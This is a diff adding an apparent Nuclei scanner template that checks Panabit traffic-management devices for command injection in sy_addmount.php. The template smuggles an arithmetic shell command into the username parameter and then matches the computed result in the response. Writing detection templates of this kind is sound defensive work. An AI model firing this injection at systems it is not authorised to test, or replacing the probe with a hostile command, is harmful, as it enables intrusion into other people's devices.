@@ -1,0 +1,21 @@
+id: panabit-syaddmount-command-exec
+
+info:
+  name: Panabit Syaddmount RCE
+  author: xpoc,NoHack
+  severity: critical
+  description: Panabit是以DPI、DFI为基础，融合多项识别技术的一款基于应用层流量管理的流控系统。
+  reference:
+    - https://blog.csdn.net/weixin_51387754/article/details/121147617
+  tags: panabit,rce
+http:
+  - raw:
+      - |-
+        GET /account/sy_addmount.php?username=|expr%20996134875%20%2B%20907032375 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '1903167250'
